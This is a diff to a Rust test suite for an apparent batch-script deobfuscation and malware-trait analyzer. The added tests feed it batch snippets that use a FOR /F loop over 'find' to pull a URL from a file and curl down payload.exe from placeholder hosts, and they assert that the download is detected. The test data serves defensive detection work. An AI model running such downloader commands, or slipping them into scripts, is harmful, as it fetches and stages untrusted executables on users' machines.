@@ -3584,6 +3584,29 @@ for /f "tokens=* delims=" %%U in ('more ^< url.txt') do curl -o payload.exe %%U"
     }
 
     #[test]
+    fn for_f_find_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://for-f-find-file.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('find "https://" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F find file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_reads_common_inventory_command_output() {
         let script = b"for /f \"tokens=1\" %%i in ('ipconfig') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('systeminfo') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('getmac') do echo %%i\r\n";
         let report = analyze(script, &Config::default());
@@ -14276,6 +14299,25 @@ mod synth_tests {
                 .all(|l| l.to_ascii_lowercase().contains("alpha")),
             "unexpected non-alpha lines: {:?}",
             lines
+        );
+    }
+
+    #[test]
+    fn synth_find_reads_tracked_file_argument() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "web.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\nhttps://find-file.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"find "https://" web.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://find-file.example/payload.exe".to_string()]
         );
     }
 
